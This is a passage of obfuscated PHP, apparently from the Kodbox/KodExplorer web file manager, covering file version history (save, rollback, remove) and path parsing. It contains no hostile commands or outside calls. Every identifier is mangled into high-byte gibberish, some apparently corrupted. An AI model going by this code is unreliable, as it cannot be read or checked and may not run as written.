$_SERVER[÷ôÚîå]; if (!$ßÌî€ƒ½) { return !1; } if (isset($GLOBALS[$€«­Õ¹[1328]]) && $GLOBALS[$€«­Õ¹[1328]]) { return; } $ÔÄ­§É = KodIO::parse($ßÌî€ƒ½); $øµúå¦é = $ÔÄ­§É[$€«­Õ¹[33]]; $Ò›†¡ƒÒ = !$øµúå¦é || $øµúå¦é == KodIO::KOD_IO || $øµúå¦é == KodIO::KOD_SHARE_ITEM; if (!$Ò›†¡ƒÒ || !$ÔÄ­§É[$€«­Õ¹[1329]]) { return !1; } if (substr($ßÌî€ƒ½, 0, strlen(DATA_PATH . $€«­Õ¹[1330])) == DATA_PATH . $€«­Õ¹[1330]) { return !1; } if ($øµúå¦é == KodIO::KOD_SHARE_ITEM) { $»èí£Õ¯ = IO::init($ßÌî€ƒ½); if ($»èí£Õ¯->pathParse[$€«­Õ¹[1243]]) { return self::parsePath($»èí£Õ¯->pathParse[$€«­Õ¹[1243]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Û…ÉÀìÕ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $€«­Õ¹[1331]); foreach ($Û…ÉÀìÕ as $öŸøü¨ö) { if (!$øµúå¦é && substr($ßÌî€ƒ½, 0, strlen($öŸøü¨ö)) == $öŸøü¨ö) { return !1; } } self::log($GLOBALS[$€«­Õ¹[1238]] . $€«­Õ¹[1332] . $ßÌî€ƒ½); return $ßÌî€ƒ½; } private static function pathHistory($´øìŸ›) { $•–“Œùã =& $_SERVER[÷ôÚîå]; $ÔÄœ¨ÙÌ = self::$_historyBase . ltrim(KodIO::clear($´øìŸ›), $•–“Œùã[8]); $ÔÄœ¨ÙÌ = str_replace(array($•–“Œùã[1333]), array($•–“Œùã[1334]), $ÔÄœ¨ÙÌ); return $ÔÄœ¨ÙÌ; } public static function log($¸ºÖ™à±) { } public static function historyCount($Û„ĞÒ›²) { $ ”åÉ«Ã =& $_SERVER[÷ôÚîå]; $Öİ„Ã‘ß = array(); $°Ïøñ÷ = array(); foreach ($Û„ĞÒ›² as $ã¨öòÆ) { $µ«“»ÖÉ = get_path_father($ã¨öòÆ); if (!$°Ïøñ÷[$µ«“»ÖÉ]) { $°Ïøñ÷[$µ«“»ÖÉ] = array(); } $°Ïøñ÷[$µ«“»ÖÉ][] = get_path_this($ã¨öòÆ); } foreach ($°Ïøñ÷ as $µ«“»ÖÉ => $Ç¤ĞÍğ¯) { $õ•ÅÌÙÆ = self::parsePath($µ«“»ÖÉ); if (!$õ•ÅÌÙÆ) { continue; } foreach ($Ç¤ĞÍğ¯ as $óÊĞ¦Æï) { $ŞïÇ‘é› = self::listData(rtrim($õ•ÅÌÙÆ, $ ”åÉ«Ã[8]) . $ ”åÉ«Ã[8] . $óÊĞ¦Æï, !1); if ($ŞïÇ‘é› && $ŞïÇ‘é›[$ ”åÉ«Ã[454]]) { $Öİ„Ã‘ß[rtrim($µ«“»ÖÉ, $ ”åÉ«Ã[8]) . $ ”åÉ«Ã[8] . $óÊĞ¦Æï] = count($ŞïÇ‘é›[$ ”åÉ«Ã[454]]); } } } return $Öİ„Ã‘ß; } public static function add($çô®Ùß) { $”ØîÜÖ¤ =& $_SERVER[÷ôÚîå]; $‹Ş¤¥ş = self::listData($çô®Ùß); if (!$‹Ş¤¥ş) { return; } $ŸÖÁĞ’¨ = Model($”ØîÜÖ¤[859])->get($”ØîÜÖ¤[1335]); $Ò”ñÈô = intval($GLOBALS[$”ØîÜÖ¤[6]][$”ØîÜÖ¤[102]][$”ØîÜÖ¤[1313]]); $³¼îŒ¦ğ = $ŸÖÁĞ’¨ == $”ØîÜÖ¤[1336] ? min(5, $Ò”ñÈô) : $Ò”ñÈô; if ($Ò”ñÈô <= 0) { return; } $‹õ›¸ôÛ = IO::info($çô®Ùß); $†ªÄ¤©Ş = $‹Ş¤¥ş[$”ØîÜÖ¤[454]]; if ($‹õ›¸ôÛ[$”ØîÜÖ¤[89]] == 0) { return; } if ($‹õ›¸ôÛ[$”ØîÜÖ¤[89]] >= 1024 * 1024 * 500) { return !1; } $øóß„ËÁ = IO::hashSimple($çô®Ùß); if ($†ªÄ¤©Ş && $†ªÄ¤©Ş[0][$”ØîÜÖ¤[681]] == $øóß„ËÁ) { return !0; } if (array_key_exists($”ØîÜÖ¤[243], $‹õ›¸ôÛ) && !$‹õ›¸ôÛ[$”ØîÜÖ¤[243]]) { return !1; } $¦íùÉß = short_id(time()); $¾ÖÁ²Î¡ = array($”ØîÜÖ¤[484] => $¦íùÉß, $”ØîÜÖ¤[681] => $øóß„ËÁ, $”ØîÜÖ¤[32] => $‹õ›¸ôÛ[$”ØîÜÖ¤[32]] . $”ØîÜÖ¤[10] . date($”ØîÜÖ¤[1337]) . rand_string(1), $”ØîÜÖ¤[89] => $‹õ›¸ôÛ[$”ØîÜÖ¤[89]], $”ØîÜÖ¤[536] => USER_ID, $”ØîÜÖ¤[241] => time(), $”ØîÜÖ¤[1338] => $”ØîÜÖ¤[12]); IO::mkdir($‹Ş¤¥ş[$”ØîÜÖ¤[1339]]); $óâÅ‰¤É = IO::copy($çô®Ùß, $‹Ş¤¥ş[$”ØîÜÖ¤[1339]], !1, $¾ÖÁ²Î¡[$”ØîÜÖ¤[32]]); if (!$óâÅ‰¤É) { self::clearEmptyFolder($‹Ş¤¥ş[$”ØîÜÖ¤[1339]]); return !1; } array_unshift($†ªÄ¤©Ş, $¾ÖÁ²Î¡); if (count($†ªÄ¤©Ş) > $³¼îŒ¦ğ) { $¿«–¬–å = array_slice($†ªÄ¤©Ş, $³¼îŒ¦ğ); foreach ($¿«–¬–å as $òÁË£¸) { IO::remove($‹Ş¤¥ş[$”ØîÜÖ¤[1339]] . $òÁË£¸[$”ØîÜÖ¤[32]]); } $†ªÄ¤©Ş = array_slice($†ªÄ¤©Ş, 0, $³¼îŒ¦ğ); } return self::saveData($‹Ş¤¥ş[$”ØîÜÖ¤[1340]], $†ªÄ¤©Ş); } public static function remove($–ÌĞ¤Õ€, $Äç¸Àñ†) { $ñ©ÎÉ¹ß =& $_SERVER[÷ôÚîå]; $Ù®ŞŸô = self::listData($–ÌĞ¤Õ€); $ãÁïŒï‰ = array(); if (!$Ù®ŞŸô) { return !1; } foreach ($Ù®ŞŸô[$ñ©ÎÉ¹ß[454]] as $áâï†˜) { if ($áâï†˜[$ñ©ÎÉ¹ß[484]] == $Äç¸Àñ†) { IO::remove($Ù®ŞŸô[$ñ©ÎÉ¹ß[1339]] . $áâï†˜[$ñ©ÎÉ¹ß[32]]); continue; } $ãÁïŒï‰[] = $áâï†˜; } return self::saveData($Ù®ŞŸô[$ñ©ÎÉ¹ß[1340]], $ãÁïŒï‰); } public static function clear($Ì‹çéú¦, $•ŸÏ¼‰Û = true) { $â„âúÈ¦ =& $_SERVER[÷ôÚîå]; $Ê‰°¬ñ¶ = self::listData($Ì‹çéú¦, $•ŸÏ¼‰Û); if (!$Ê‰°¬ñ¶) { return !1; } foreach ($Ê‰°¬ñ¶[$â„âúÈ¦[454]] as $ã‚Çéû¦) { IO::remove($Ê‰°¬ñ¶[$â„âúÈ¦[1339]] . $ã‚Çéû¦[$â„âúÈ¦[32]]); } return self::saveData($Ê‰°¬ñ¶[$â„âúÈ¦[1340]], array()); } public static function moveHistory($é‰à‡¾¡, $ÓÉë´ó• = '', $¬Á¾Ë¤ñ = '') { $öÅ´«Şå =& $_SERVER[÷ôÚîå]; $¾ÁšÌ·À = self::listData($é‰à‡¾¡, !1); if (!$¾ÁšÌ·À || !$¾ÁšÌ·À[$öÅ´«Şå[454]]) { return !1; } $¹µÖ°¥ = $öÅ´«Şå[1327]; $ÓÉë´ó• = $ÓÉë´ó• ? $ÓÉë´ó• : get_path_this($é‰à‡¾¡); $¬Á¾Ë¤ñ = $¬Á¾Ë¤ñ ? $¬Á¾Ë¤ñ : $¾ÁšÌ·À[$öÅ´«Şå[1339]]; $¦Áîø… = substr(get_path_this($¾ÁšÌ·À[$öÅ´«Şå[1340]]), 0, -strlen($¹µÖ°¥)); foreach ($¾ÁšÌ·À[$öÅ´«Şå[454]] as $¶ÔòÕ¦à => $¶òäÂ¢) { $”ó†ùªİ = $ÓÉë´ó• . substr($¶òäÂ¢[$öÅ´«Şå[32]], strlen($¦Áîø…)); $–îÃÛ²³ = IO::move($¾ÁšÌ·À[$öÅ´«Şå[1339]] . $¶òäÂ¢[$öÅ´«Şå[32]], $¬Á¾Ë¤ñ, !1, $”ó†ùªİ); if ($–îÃÛ²³) { $¾ÁšÌ·À[$öÅ´«Şå[454]][$¶ÔòÕ¦à][$öÅ´«Şå[32]] = $”ó†ùªİ; } } $¾ÁšÌ·À[$öÅ´«Şå[1340]] = IO::move($¾ÁšÌ·À[$öÅ´«Şå[1340]], $¬Á¾Ë¤ñ, !1, $ÓÉë´ó• . $¹µÖ°¥); self::saveData($¾ÁšÌ·À[$öÅ´«Şå[1340]], $¾ÁšÌ·À[$öÅ´«Şå[454]]); self::clearEmptyFolder($¾ÁšÌ·À[$öÅ´«Şå[1339]]); } public static function rollback($–©üÓÕ, $·°½Ú×¿) { $Üîö™˜ =& $_SERVER[÷ôÚîå]; $í‰ş®…ù = self::listData($–©üÓÕ); if (!$í‰ş®…ù) { return; } $îíëˆ‘Î = IO::info($–©üÓÕ); foreach ($í‰ş®…ù[$Üîö™˜[454]] as $ç½öÀ† => $èÖ‚¼Ïª) { if ($èÖ‚¼Ïª[$Üîö™˜[484]] == $·°½Ú×¿) { self::add($–©üÓÕ); $¾àñ—Ÿì = $í‰ş®…ù[$Üîö™˜[1339]] . $èÖ‚¼Ïª[$Üîö™˜[32]]; $ğÛØã„Ú = IO::copy($¾àñ—Ÿì, IO::pathFather($–©üÓÕ), REPEAT_REPLACE, $îíëˆ‘Î[$Üîö™˜[32]]); if ($ğÛØã„Ú) { self::remove($–©üÓÕ, $·°½Ú×¿); } return $ğÛØã„Ú; } } return !1; } public static function setDetail($ëËãëÁ, $ÌØù‡ù„, $ôÆ‘ìÎù) { $˜º¸† =& $_SERVER[÷ôÚîå]; $˜×ÔÏî€ = self::listData($ëËãëÁ); if (!$˜×ÔÏî€) { return; } foreach ($˜×ÔÏî€[$˜º¸†[454]] as $Ó±º›š¯ => $Ëº¦Ì•ˆ) { if ($Ëº¦Ì•ˆ[$˜º¸†[484]] == $ÌØù‡ù„) { $˜×ÔÏî€[$˜º¸†[454]][$Ó±º›š¯][$˜º¸†[1338]] = $ôÆ‘ìÎù; self::saveData($˜×ÔÏî€[$˜º¸†[1340]], $˜×ÔÏî€[$˜º¸†[454]]); return !0; } } return !1; } public static function fileInfo($Ä”Äúş¬, $Îç£±—ã) { $Ô·¡·‰Ã =& $_SERVER[÷ôÚîå]; $ì°ç¡Ğİ = self::listData($Ä”Äúş¬); if (!$ì°ç¡Ğİ) { show_json(LNG($Ô·¡·‰Ã[118]), !1); } $¸‹¹±Ñ = $Ô·¡·‰Ã[12]; foreach ($ì°ç¡Ğİ[$Ô·¡·‰Ã[454]] as $»î­§‘— => $³»õÜ‡Ò) { if ($³»õÜ‡Ò[$Ô·¡·‰Ã[484]] != $Îç£±—ã) { continue; } $¸‹¹±Ñ = $ì°ç¡Ğİ[$Ô·¡·‰Ã[1339]] . $³»õÜ‡Ò[$Ô·¡·‰Ã[32]]; break; } if (!$¸‹¹±Ñ) { show_json(LNG($Ô·¡·‰Ã[118]), !1); } return IO::info($¸‹¹±Ñ); } public static function fileOut($®½‹ğ¦Ë, $ÈÒÔ¢ç, $Øµìª•Ÿ = false) { $ÏâÌá‚† =& $_SERVER[÷ôÚîå]; $”…àƒ´ = self::fileInfo($®½‹ğ¦Ë, $ÈÒÔ¢ç); $˜Ñà®±Ü =& $GLOBALS[$ÏâÌá‚†[7]]; $Øµìª•Ÿ = isset($˜Ñà®±Ü[$ÏâÌá‚†[1290]]) && $˜Ñà®±Ü[$ÏâÌá‚†[1290]] == 1; if (isset($˜Ñà®±Ü[$ÏâÌá‚†[33]]) && $˜Ñà®±Ü[$ÏâÌá‚†[33]] == $ÏâÌá‚†[1341]) { return IO::fileOutImage($”…àƒ´[$ÏâÌá‚†[97]], $˜Ñà®±Ü[$ÏâÌá‚†[1342]]); } IO::fileOut($”…àƒ´[$ÏâÌá‚†[97]], $Øµìª•Ÿ, get_path_this($®½‹ğ¦Ë)); } public static function listData($•…¿èÏ˜, $ë°óàí– = true) { $£şåµª… =& $_SERVER[÷ôÚîå]; if ($ë°óàí– && !IO::exist($•…¿èÏ˜)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($•…¿èÏ˜, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¡…‹ô¿ = self::pathHistory($•…¿èÏ˜); $×ùÙ€Œ = array($£şåµª…[1340] => $¡…‹ô¿ . $£şåµª…[1327], $£şåµª…[1339] => rtrim(get_path_father($¡…‹ô¿), $£şåµª…[8]) . $£şåµª…[8], $£şåµª…[454] => array()); $¿¢Æ¢¤ = IO::getContent($×ùÙ€Œ[$£şåµª…[1340]]); if ($¿¢Æ¢¤) { $ê¼—÷¦ = json_decode($¿¢Æ¢¤, !0); if (is_array($ê¼—÷¦)) { $×ùÙ€Œ[$£şåµª…[454]] = $ê¼—÷¦; } } return $×ùÙ€Œ; } private static function saveData($Ï±¶ûƒ¤, $Ä—ú‹Ùü) { $Î¤í°œŒ =& $_SERVER[÷ôÚîå]; self::log($Î¤í°œŒ[1343] . $Ï±¶ûƒ¤ . $Î¤í°œŒ[84] . count($Ä—ú‹Ùü), $Î¤í°œŒ[841]); if ($Ä—ú‹Ùü) { return IO::setContent($Ï±¶ûƒ¤, json_encode($Ä—ú‹Ùü)); } $ıÛÌªŒ¶ = IO::pathFather($Ï±¶ûƒ¤); IO::remove($Ï±¶ûƒ¤); self::clearEmptyFolder($ıÛÌªŒ¶); return !0; } public static function clearEmptyFolder($ù¦›ÁóÑ) { $³¿éßí =& $_SERVER[÷ôÚîå]; if (trim($ù¦›ÁóÑ, $³¿éßí[8]) == trim(self::$_historyBase, $³¿éßí[8])) { return; } $ÇŸò ‹˜ = IO::pathFather($ù¦›ÁóÑ); $òşÙş˜¾ = IO::has($ù¦›ÁóÑ, !0); if ($òşÙş˜¾[$³¿éßí[249]] > 0 || $òşÙş˜¾[$³¿éßí[250]] > 0) { return; } IO::remove($ù¦›ÁóÑ); self::clearEmptyFolder($ÇŸò ‹˜); } private static function getBasePath() { $¡÷Û¬èî =& $_SERVER[÷ôÚîå]; $óÂšÓ×½ = Model($¡÷Û¬èî[1344])->get($¡÷Û¬èî[1345]); if ($óÂšÓ×½) { if (!IO::exist($óÂšÓ×½)) { IO::mkdir($óÂšÓ×½); } if (get_path_this($óÂšÓ×½) == $¡÷Û¬èî[1330]) { $¿ï£…Ñ³ = $¡÷Û¬èî[1346] . rand_string(8); @rename($óÂšÓ×½, get_path_father($óÂšÓ×½) . $¡÷Û¬èî[8] . $¿ï£…Ñ³); $óÂšÓ×½ = DATA_PATH . $¿ï£…Ñ³ . $¡÷Û¬èî[8]; file_put_contents(DATA_PATH . $¡÷Û¬èî[1277], $¡÷Û¬èî[12]); Model($¡÷Û¬èî[1344])->set($¡÷Û¬èî[1345], $óÂšÓ×½); } return $óÂšÓ×½; } $óÂšÓ×½ = DATA_PATH . $¡÷Û¬èî[1346] . rand_string(8) . $¡÷Û¬èî[8]; $óÂšÓ×½ = IO::mkdir($óÂšÓ×½); $óÂšÓ×½ = rtrim($óÂšÓ×½, $¡÷Û¬èî[8]) . $¡÷Û¬èî[8]; file_put_contents($óÂšÓ×½ . $¡÷Û¬èî[1277], $¡÷Û¬èî[12]); file_put_contents(DATA_PATH . $¡÷Û¬èî[1277], $¡÷Û¬èî[12]); Model($¡÷Û¬èî[1344])->set($¡÷Û¬èî[1345], $óÂšÓ×½); return $óÂšÓ×½; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\x72\x63\x65\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\x72\122\145\x63\x79\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\x73\x65\162\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\106\x69\154\145\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\145\x72\106\151\x6c\145\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\160\122\157\157\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\x53\150\x61\x72\145\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\x72\x53\150\141\162\145\114\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\x61\x72\x65\124\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\141\162\x65\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\162\145\x49\164\145\x6d\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\173\142\x6c\157\x63\x6b\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\x52\x65\156\143\145\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\144\162\151\x76\145\x72\x7d"; public static function typeList() { $ó…ÕşÆ¢ =& $_SERVER[÷ôÚîå]; return array($ó…ÕşÆ¢[1347] => self::KOD_SOURCE, $ó…ÕşÆ¢[1348] => self::KOD_USER_RECYCLE, $ó…ÕşÆ¢[1349] => self::KOD_USER_FAV, $ó…ÕşÆ¢[1350] => self::KOD_USER_FILE_TAG, $ó…ÕşÆ¢[1351] => self::KOD_USER_FILE_TYPE, $ó…ÕşÆ¢[1352] => self::KOD_GROUP_ROOT_SELF, $ó…ÕşÆ¢[1353] => self::KOD_USER_SHARE, $ó…ÕşÆ¢[1354] => self::KOD_USER_SHARE_LINK, $ó…ÕşÆ¢[1355] => self::KOD_USER_SHARE_TO_ME, $ó…ÕşÆ¢[1356] => self::KOD_SHARE_ITEM, $ó…ÕşÆ¢[1357] => self::KOD_SHARE_LINK, $ó…ÕşÆ¢[1358] => self::KOD_SEARCH, $ó…ÕşÆ¢[1359] => self::KOD_BLOCK, $ó…ÕşÆ¢[1360] => self::KOD_IO, $ó…ÕşÆ¢[1361] => self::KOD_USER_RECENT, $ó…ÕşÆ¢[1362] => self::KOD_USER_DRIVER); } public static function parse($ÕÇÅÈ¸Æ) { $¶œèºÏü =& $_SERVER[÷ôÚîå]; $ÕÇÅÈ¸Æ = self::clear($ÕÇÅÈ¸Æ); $‰¥ñŞ§º = array_values(self::typeList()); preg_match($¶œèºÏü[1363], $ÕÇÅÈ¸Æ, $Äö«õğš); $³·æ‚°‹ = array($¶œèºÏü[505] => !1, $¶œèºÏü[1364] => !1, $¶œèºÏü[502] => !1, $¶œèºÏü[97] => $ÕÇÅÈ¸Æ, $¶œèºÏü[1262] => !1, $¶œèºÏü[1261] => $¶œèºÏü[12]); if (is_array($Äö«õğš) && count($Äö«õğš) == 5) { $¡ß®êÒ = $¶œèºÏü[1365] . $Äö«õğš[2] . $¶œèºÏü[412]; if (in_array($¡ß®êÒ, $‰¥ñŞ§º)) { $³·æ‚°‹[$¶œèºÏü[1262]] = $Äö«õğš[1]; $³·æ‚°‹[$¶œèºÏü[33]] = $¡ß®êÒ; $³·æ‚°‹[$¶œèºÏü[1366]] = substr($¡ß®êÒ, 1, -1); $³·æ‚°‹[$¶œèºÏü[484]] = $Äö«õğš[3]; } $³·æ‚°‹[$¶œèºÏü[1261]] = $Äö«õğš[4]; } $èÀ…„¶  = array($¶œèºÏü[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $³·æ‚°‹[$¶œèºÏü[1329]] = in_array($³·æ‚°‹[$¶œèºÏü[33]], $èÀ…„¶ ); return $³·æ‚°‹; } public static function isTruePath($’®¯éøˆ) { $‰ò–˜Ÿ =& $_SERVER[÷ôÚîå]; if (substr($’®¯éøˆ, 0, 1) != $‰ò–˜Ÿ[1365]) { return !0; } if (strpos($’®¯éøˆ, $‰ò–˜Ÿ[492]) === 0) { return !0; } if (strpos($’®¯éøˆ, $‰ò–˜Ÿ[1333]) === 0) { return !0; } if (strpos($’®¯éøˆ, $‰ò–˜Ÿ[1367]) === 0) { return !0; } if (strpos($’®¯éøˆ, $‰ò–˜Ÿ[1368]) === 0) { return !0; } if (strpos($’®¯éøˆ, $‰ò–˜Ÿ[1369]) === 0) { return !0; } return !1; } public static function clear($µëÙÏÔè) { $¸—íëğş =& $_SERVER[÷ôÚîå]; $µëÙÏÔè = str_replace(array($¸—íëğş[1168], $¸—íëğş[65]), $¸—íëğş[53], $µëÙÏÔè); $µëÙÏÔè = str_replace($¸—íëğş[110], $¸—íëğş[8], $µëÙÏÔè); $¤ËµÅÑé = $¸—íëğş[1370]; if (substr($µëÙÏÔè, 0, 3) == $¸—íëğş[1371]) { $µëÙÏÔè = substr($µëÙÏÔè, 3); } while (strstr($µëÙÏÔè, $¤ËµÅÑé)) { $µëÙÏÔè = str_replace($¤ËµÅÑé, $¸—íëğş[8], $µëÙÏÔè); } $µëÙÏÔè = preg_replace($¸—íëğş[1372], $¸—íëğş[8], $µëÙÏÔè); if ($µëÙÏÔè == $¸—íëğş[8]) { return $¸—íëğş[8]; } $µëÙÏÔè = rtrim($µëÙÏÔè, $¸—íëğş[8]); return $µëÙÏÔè; } public static function pathTrue($¨¾ğéÊÜ) { $äòï“…ß =& $_SERVER[÷ôÚîå]; if (!$¨¾ğéÊÜ) { return $äòï“…ß[12]; } $¨¾ğéÊÜ = str_replace($äòï“…ß[601], $äòï“…ß[8], str_replace($äòï“…ß[1373], $äòï“…ß[8], $¨¾ğéÊÜ)); $¨¾ğéÊÜ = str_replace($äòï“…ß[601], $äòï“…ß[8], str_replace($äòï“…ß[1373], $äòï“…ß[8], $¨¾ğéÊÜ)); if (!strstr($¨¾ğéÊÜ, $äòï“…ß[1371])) { return $¨¾ğéÊÜ; } $‚ˆ¶ô¯ = explode($äòï“…ß[8], $¨¾ğéÊÜ); foreach ($‚ˆ¶ô¯ as $ÄÅ•œÍ¥ => $ÖØ¬úı§) { if ($ÖØ¬úı§ !== $äòï“…ß[1374]) { continue; } for ($©Òé÷ = $ÄÅ•œÍ¥; $©Òé÷ >= 0; $©Òé÷--) { if ($‚ˆ¶ô¯[$©Òé÷] === $äòï“…ß[10] || $‚ˆ¶ô¯[$©Òé÷] === $äòï“…ß[1374] || $‚ˆ¶ô¯[$©Òé÷] === -1) { continue; } if ($‚ˆ¶ô¯[$©Òé÷] === $äòï“…ß[12]) { $‚ˆ¶ô¯[$ÄÅ•œÍ¥] = -1; break; } $‚ˆ¶ô¯[$ÄÅ•œÍ¥] = -1; $‚ˆ¶ô¯[$©Òé÷] = -1; break; } } $½¡¡İçÃ = array(); foreach ($‚ˆ¶ô¯ as $ÖØ¬úı§) { if ($ÖØ¬úı§ !== -1) { $½¡¡İçÃ[] = $ÖØ¬úı§; } } $Ø»â‹² = implode($äòï“…ß[8], $½¡¡İçÃ); if (strpos($Ø»â‹², $äòï“…ß[1375]) === 0) { $Ø»â‹² = $äòï“…ß[1371] . substr($Ø»â‹², strlen($äòï“…ß[1375])); } return $Ø»â‹²; } public static function pathUrlClear($ÜßÔì­Ú) { $¥ÙğÉãÌ =& $_SERVER[÷ôÚîå]; if (!$ÜßÔì­Ú) { return $ÜßÔì­Ú; } $ÜßÔì­Ú = rawurldecode($ÜßÔì­Ú); $ÜßÔì­Ú = str_replace($¥ÙğÉãÌ[1373], $¥ÙğÉãÌ[8], $ÜßÔì­Ú); if (strpos($ÜßÔì­Ú, $¥ÙğÉãÌ[86]) > 0) { $ÜßÔì­Ú = substr($ÜßÔì­Ú, 0, strpos($ÜßÔì­Ú, $¥ÙğÉãÌ[86])); } if (strpos($ÜßÔì­Ú, $¥ÙğÉãÌ[1376]) > 0) { $ÜßÔì­Ú = substr($ÜßÔì­Ú, 0, strpos($ÜßÔì­Ú, $¥ÙğÉãÌ[1376])); } return $ÜßÔì­Ú; } public static function sourceID($¹Úä¦ş) { $èíã“é =& $_SERVER[÷ôÚîå]; $÷–³ŠÃ = self::parse($¹Úä¦ş); if ($÷–³ŠÃ[$èíã“é[33]] !== self::KOD_SOURCE) { show_json(LNG($èíã“é[1377]), !1); } return $÷–³ŠÃ[$èíã“é[484]]; } public static function make($Êé±¶–ö) { if (!$Êé±¶–ö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Êé±¶–ö)); } public static function makeShare($Àßüá«®, $éş”Û×¨) { return self::makePath(self::KOD_SHARE_ITEM, $Àßüá«®, $éş”Û×¨); } public static function makeFileTypePath($İçÅòÂ) { return self::makePath(self::KOD_USER_FILE_TYPE, $İçÅòÂ); } public static function makeFileTagPath($€î¬Ä¢ì) { return self::makePath(self::KOD_USER_FILE_TAG, $€î¬Ä¢ì); } public static function makePath($Á×‹îè°, $³ÛŠ½ = '', $‰ôÅİ…û = '') { $¯¤ÀÑò˜ =& $_SERVER[÷ôÚîå]; $õŠ§™¤ú = substr($Á×‹îè°, 1, -1); $öµÅÛƒ÷ = $¯¤ÀÑò˜[1378] . $õŠ§™¤ú . $¯¤ÀÑò˜[1379] . $³ÛŠ½ . $¯¤ÀÑò˜[1380]; $öµÅÛƒ÷ = $‰ôÅİ…û ? $öµÅÛƒ÷ . $‰ôÅİ…û . $¯¤ÀÑò˜[8] : $öµÅÛƒ÷; return $öµÅÛƒ÷; } public static function hashPath($ßíÖ®Ñ, $ÁÁã»õ = true) { $ú‰™Èª =& $_SERVER[÷ôÚîå]; $Ä¡Ëá¸İ = is_array($ßíÖ®Ñ) ? $ßíÖ®Ñ : IO::info($ßíÖ®Ñ); $•ˆõ€ = _get($Ä¡Ëá¸İ, $ú‰™Èª[1381], $ú‰™Èª[12]); if (!$•ˆõ€ && isset($Ä¡Ëá¸İ[$ú‰™Èª[245]])) { $•ˆõ€ = trim($Ä¡Ëá¸İ[$ú‰™Èª[245]], $ú‰™Èª[131]); } if (!$•ˆõ€ && isset($Ä¡Ëá¸İ[$ú‰™Èª[203]]) && $Ä¡Ëá¸İ[$ú‰™Èª[203]]) { $Ä¡Ëá¸İ = IO::info(KodIO::make($Ä¡Ëá¸İ[$ú‰™Èª[203]])); $•ˆõ€ = _get($Ä¡Ëá¸İ, $ú‰™Èª[1381], $ú‰™Èª[12]); } $ßÅÎÀËş = md5($Ä¡Ëá¸İ[$ú‰™Èª[97]] . $Ä¡Ëá¸İ[$ú‰™Èª[89]] . $Ä¡Ëá¸İ[$ú‰™Èª[98]]); if (!$•ˆõ€ && file_exists($Ä¡Ëá¸İ[$ú‰™Èª[97]])) { $•ˆõ€ = Cache::get($ßÅÎÀËş . $ú‰™Èª[1382]); $•ˆõ€ = !1; if (!$•ˆõ€) { $•ˆõ€ = IO::hashSimple($Ä¡Ëá¸İ[$ú‰™Èª[97]]); Cache::set($ßÅÎÀËş . $ú‰™Èª[1382], $•ˆõ€, 3600 * 24 * 30); } } if ($ÁÁã»õ && !$•ˆõ€) { } return $•ˆõ€ ? $•ˆõ€ : $ßÅÎÀËş; } public static function hashPathSafe($¤ ‘“û, $…ïœ£‘Ñ = true) { $¬’²‘ï =& $_SERVER[÷ôÚîå]; $Íıó“›« = self::hashPath($¤ ‘“û, $…ïœ£‘Ñ); return md5($Íıó“›« . $¬’²‘ï[1383] . Model($¬’²‘ï[859])->get($¬’²‘ï[860])); } public static function initSystemPath() { $Ÿ©û±ş¹ =& $_SERVER[÷ôÚîå]; if (defined($Ÿ©û±ş¹[1384])) { return; } define($Ÿ©û±ş¹[1384], self::systemPath($Ÿ©û±ş¹[201])); define($Ÿ©û±ş¹[1385], self::systemPath($Ÿ©û±ş¹[1386])); define($Ÿ©û±ş¹[1387], self::systemPath($Ÿ©û±ş¹[1388])); define($Ÿ©û±ş¹[1389], self::systemPath($Ÿ©û±ş¹[1390])); IOHistory::bindEvent(); } public static function systemPath($ù›†—à) { $çÊÕü×Ó =& $_SERVER[÷ôÚîå]; $÷‚÷ì = $çÊÕü×Ó[1391] . ucfirst($ù›†—à); $²‡Ä×ü = Model($çÊÕü×Ó[859])->get($÷‚÷ì); if ($²‡Ä×ü) { return $²‡Ä×ü; } if ($ù›†—à == $çÊÕü×Ó[201]) { $²‡Ä×ü = self::make(Model($çÊÕü×Ó[914])->systemRootPathAdd($çÊÕü×Ó[614])); } else { $²‡Ä×ü = self::systemPath($çÊÕü×Ó[201]); $í»Ÿş•ˆ = self::sourceID($²‡Ä×ü); $²‡Ä×ü = self::make(Model($çÊÕü×Ó[914])->mkdir($í»Ÿş•ˆ, $ù›†—à)); } Model($çÊÕü×Ó[859])->set($÷‚÷ì, $²‡Ä×ü); return $²‡Ä×ü; } public static function systemFolder($öŠ°‹š) { $±¨è‰ëÂ = IO_PATH_SYSTEM_SOURCE . $öŠ°‹š; $ÎËˆÇ = Cache::get($±¨è‰ëÂ); if (!$ÎËˆÇ) { $Ÿ¹ùá›Ó = IO::infoFullSimple($±¨è‰ëÂ); if (!$Ÿ¹ùá›Ó) { $ÎËˆÇ = IO::mkdir($±¨è‰ëÂ, REPEAT_SKIP); } else { $ÎËˆÇ = $Ÿ¹ùá›Ó[$_SERVER[÷ôÚîå][97]]; } Cache::set($±¨è‰ëÂ, $ÎËˆÇ, 3600 * 10); } return $ÎËˆÇ; } public static function defaultDriver() { return Model($_SERVER[÷ôÚîå][856])->defaultDriver(); } public static function defaultIO() { $¦ğ™¹ÉÜ =& $_SERVER[÷ôÚîå]; $šò×»± = self::defaultDriver(); return 